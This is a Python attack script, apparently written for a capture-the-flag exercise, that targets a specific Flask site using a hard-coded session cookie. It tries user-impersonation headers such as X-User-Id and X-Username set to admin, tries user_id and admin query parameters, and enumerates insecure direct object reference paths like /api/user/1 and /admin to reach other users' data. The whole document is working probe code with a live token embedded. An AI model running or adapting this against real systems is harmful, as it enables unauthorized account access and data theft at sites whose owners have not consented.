#!/usr/bin/env python3
"""
Дальше без секрета: переопределение user через заголовки/query и быстрый IDOR.
Запуск: python3 flask_session_next.py
"""
import warnings
warnings.filterwarnings("ignore", message="urllib3 v2 only supports OpenSSL")
import requests

BASE = "http://sandwich.duckerz.ru"
COOKIE = "eyJjc3JmX3Rva2VuIjoiMTliYmNhNzRjYTMzYjM2YzJjNDFmMDEzODY4MDJjMjVlYTQzYjFlZiIsInVzZXJfaWQiOjI0LCJ1c2VybmFtZSI6InF3ZXJ0eTEyMyJ9.aYeXBQ.7yntcsQOzRzaF335kn6HPumFeww"
SESSION = {"session": COOKIE}

# Эталон: ответ дашборда с твоей сессией (user_id=24)
DASHBOARD_URL = f"{BASE}/dashboard"
BASELINE_LEN = 9859  # если изменится — поправь после одного запуска оригинала


def req(method="GET", url=DASHBOARD_URL, headers=None, params=None, cookies=SESSION):
    r = requests.request(
        method, url, headers=headers or {}, params=params, cookies=cookies,
        allow_redirects=False, timeout=10
    )
    return r.status_code, len(r.content), r


def main():
    s = requests.Session()
    s.cookies.set("session", COOKIE)
    s.headers["User-Agent"] = "CTF-check/1.0"

    print("=== 1. Переопределение user (заголовки / query) ===\n")
    baseline_code, baseline_len, _ = req(cookies=SESSION)
    print(f"  Контроль GET /dashboard: {baseline_code}, {baseline_len} bytes\n")

    # Заголовки, которые иногда подставляют user
    override_headers = [
        ("X-User-Id", "1"),
        ("X-User-Id", "0"),
        ("X-User-ID", "1"),
        ("X-Original-User-Id", "1"),
        ("X-Forwarded-User-Id", "1"),
        ("X-Real-User-Id", "1"),
        ("User-Id", "1"),
        ("X-Username", "admin"),
    ]
    for name, value in override_headers:
        code, length, r = req(headers={name: value})
        diff = "" if length == baseline_len else f" <- ДРУГОЙ РАЗМЕР {length}"
        print(f"  {name}: {value} -> {code}, {length} b{diff}")

    # Query
    for param, val in [("user_id", "1"), ("user_id", "0"), ("uid", "1"), ("admin", "1")]:
        code, length, r = req(params={param: val})
        diff = "" if length == baseline_len else f" <- ДРУГОЙ РАЗМЕР {length}"
        print(f"  ?{param}={val} -> {code}, {length} b{diff}")

    print("\n=== 2. Быстрый IDOR (если есть API по user_id) ===\n")
    idor_paths = [
        f"{BASE}/api/user/1",
        f"{BASE}/api/users/1",
        f"{BASE}/api/profile/1",
        f"{BASE}/user/1",
        f"{BASE}/users/1",
        f"{BASE}/dashboard?user_id=1",
        f"{BASE}/admin",
        f"{BASE}/api/orders",
        f"{BASE}/api/me",
    ]
    for url in idor_paths:
        code, length, r = req(url=url)
        if code == 200 and length != 0:
            print(f"  200 {length:5} b  {url}")
        elif code != 404:
            print(f"  {code}  {length:5} b  {url}")

    print("\nГотово. Если какой-то запрос дал другой размер/контент — открыть в браузере с той же кукой.")
    print("Дальше: обойти сайт вручную (ссылки, формы), искать /api/*, смотреть запросы в DevTools.")


if __name__ == "__main__":
    main()
